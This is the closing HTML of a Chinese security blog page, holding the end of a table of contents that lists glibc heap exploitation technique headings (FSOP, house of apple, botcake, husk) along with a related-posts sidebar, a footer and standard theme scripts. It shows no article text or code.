href="#malloc-assert%E4%B8%8EFSOP"><span class="toc-number">13.0.2.3.</span> <span class="toc-text">__malloc_assert与FSOP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E7%A7%8D%E5%8F%AF%E8%A1%8C%E7%9A%84IO%E8%B0%83%E7%94%A8%E9%93%BE"><span class="toc-number">13.0.2.4.</span> <span class="toc-text">一种可行的IO调用链</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fake-IO%E7%BB%93%E6%9E%84%E4%BD%93%E9%9C%80%E8%A6%81%E7%BB%95%E8%BF%87%E7%9A%84%E6%A3%80%E6%B5%8B"><span class="toc-number">13.0.2.5.</span> <span class="toc-text">fake_IO结构体需要绕过的检测</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-number">13.0.3.</span> <span class="toc-text">攻击流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF"><span class="toc-number">13.0.3.1.</span> <span class="toc-text">模板</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-apple1"><span class="toc-number">14.</span> <span class="toc-text">house of apple1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-apple2"><span class="toc-number">15.</span> <span class="toc-text">house of apple2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-apple3"><span class="toc-number">16.</span> <span class="toc-text">house of apple3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-botcake"><span class="toc-number">17.</span> <span class="toc-text">house of botcake</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-husk"><span class="toc-number">18.</span> <span class="toc-text">house of husk</span></a></li></ol></div></div><div class="card-widget card-recommend-post"><div class="item-headline"><i class="fas fa-dharmachakra"></i><span>相关推荐</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/21638/" title="FCTF"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/8373377e69c3499d90.jpg" alt="FCTF"></a><div class="content"><a class="title" href="/posts/21638/" title="FCTF">FCTF</a><time datetime="2023-04-18" title="发表于 2023-04-18">2023-04-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/1518/" title="file虚表函数学习"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/a96d6be2655648d9ab6dc8b314f2a8d1%20(1).jpg" alt="file虚表函数学习"></a><div class="content"><a class="title" href="/posts/1518/" title="file虚表函数学习">file虚表函数学习</a><time datetime="2023-10-19" title="发表于 2023-10-19">2023-10-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/35200/" title="ida伪代码生成失败应对"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/cover2.jpg" alt="ida伪代码生成失败应对"></a><div class="content"><a class="title" href="/posts/35200/" title="ida伪代码生成失败应对">ida伪代码生成失败应对</a><time datetime="2023-06-26" title="发表于 2023-06-26">2023-06-26</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 By ixout</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><a class="icon-V hidden" onclick="switchNightMode()" title="浅色和深色模式转换"><svg width="25" height="25" viewBox="0 0 1024 1024"><use id="modeicon" xlink:href="#icon-moon"></use></svg></a><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button><button id="go-down" type="button" title="直达底部" onclick="btf.scrollToDest(document.body.scrollHeight, 500)"><i class="fas fa-arrow-down"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"></div><canvas id="universe"></canvas><script defer src="/js/universe.js"></script><script defer src="/js/cursor.js"></script><script async src="/js/fps.js"></script><script async src="/js/title.js"></script><script src="/js/sun_moon.js" async></script><script async src="//at.alicdn.com/t/c/font_3930344_38rvofbfw64.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="20px" data-random="false" async="async"></script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div><!-- hexo injector body_end start --><script async src="//at.alicdn.com/t/font_2032782_8d5kxvn09md.js"></script><!-- hexo injector body_end end --></body></html>